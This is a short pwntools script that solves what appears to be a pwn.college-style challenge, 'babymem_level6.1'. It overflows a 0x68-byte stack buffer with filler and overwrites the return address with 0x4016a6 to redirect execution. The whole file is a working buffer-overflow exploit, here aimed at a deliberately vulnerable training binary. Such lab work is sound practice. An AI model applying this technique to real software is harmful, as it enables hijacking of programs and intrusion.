from pwn import *

# Init
elf = ELF("/challenge/babymem_level6.1")

buffer_length = int("68", 16) #local_68

io = elf.process()

# payload
payload = b"A"*(buffer_length) + p64(0x4016a6)

# Interaction
io.recvuntil("size:")
io.sendline(str(buffer_length + 8))

io.recvuntil("bytes)!")
io.sendline(payload)

io.interactive()